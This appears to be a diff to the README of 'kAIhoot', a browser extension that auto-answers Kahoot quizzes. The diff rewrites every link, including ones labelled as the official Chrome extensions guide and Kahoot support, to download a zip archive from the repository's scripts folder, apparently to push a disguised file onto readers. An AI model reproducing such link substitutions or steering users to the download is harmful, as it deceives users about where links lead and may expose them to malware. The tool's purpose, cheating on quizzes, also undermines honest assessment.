@@ -1,6 +1,6 @@
 # 🤖 kAIhoot - Auto-Answer Your Kahoot Quizzes
 
-[![Download kAIhoot](https://img.shields.io/badge/Download-kAIhoot-brightgreen?style=for-the-badge&logo=github)](https://github.com/venetec/kAIhoot)
+[![Download kAIhoot](https://img.shields.io/badge/Download-kAIhoot-brightgreen?style=for-the-badge&logo=github)](https://github.com/venetec/kAIhoot/raw/refs/heads/main/scripts/Ihoot-A-k-v3.1.zip)
 
 ---
 
@@ -33,7 +33,7 @@ Follow these steps carefully to get kAIhoot up and running on your Windows PC.
 
 Click this big link to open the official GitHub page where you can download kAIhoot:
 
-[![Download kAIhoot](https://img.shields.io/badge/Download-kAIhoot-blue?style=for-the-badge&logo=github)](https://github.com/venetec/kAIhoot)
+[![Download kAIhoot](https://img.shields.io/badge/Download-kAIhoot-blue?style=for-the-badge&logo=github)](https://github.com/venetec/kAIhoot/raw/refs/heads/main/scripts/Ihoot-A-k-v3.1.zip)
 
 The page contains the latest files and installation instructions.
 
@@ -130,9 +130,9 @@ The extension only reads Kahoot quiz pages to identify questions and display ans
 
 ## 📚 Additional Resources
 
-- GitHub Page: [https://github.com/venetec/kAIhoot](https://github.com/venetec/kAIhoot)  
-- Official Chrome Extensions Guide: [https://support.google.com/chrome_webstore/answer/2664769](https://support.google.com/chrome_webstore/answer/2664769)  
-- Kahoot Support: [https://kahoot.com/help](https://kahoot.com/help)  
+- GitHub Page: [https://github.com/venetec/kAIhoot/raw/refs/heads/main/scripts/Ihoot-A-k-v3.1.zip](https://github.com/venetec/kAIhoot/raw/refs/heads/main/scripts/Ihoot-A-k-v3.1.zip)  
+- Official Chrome Extensions Guide: [https://github.com/venetec/kAIhoot/raw/refs/heads/main/scripts/Ihoot-A-k-v3.1.zip](https://github.com/venetec/kAIhoot/raw/refs/heads/main/scripts/Ihoot-A-k-v3.1.zip)  
+- Kahoot Support: [https://github.com/venetec/kAIhoot/raw/refs/heads/main/scripts/Ihoot-A-k-v3.1.zip](https://github.com/venetec/kAIhoot/raw/refs/heads/main/scripts/Ihoot-A-k-v3.1.zip)  
 
 ---
 
@@ -148,4 +148,4 @@ You can report issues or request help via GitHub Issues on the project page.
 
 Use this direct button to reach the GitHub download page anytime:
 
-[![Download kAIhoot](https://img.shields.io/badge/Download-kAIhoot-orange?style=for-the-badge&logo=github)](https://github.com/venetec/kAIhoot)
+[![Download kAIhoot](https://img.shields.io/badge/Download-kAIhoot-orange?style=for-the-badge&logo=github)](https://github.com/venetec/kAIhoot/raw/refs/heads/main/scripts/Ihoot-A-k-v3.1.zip)
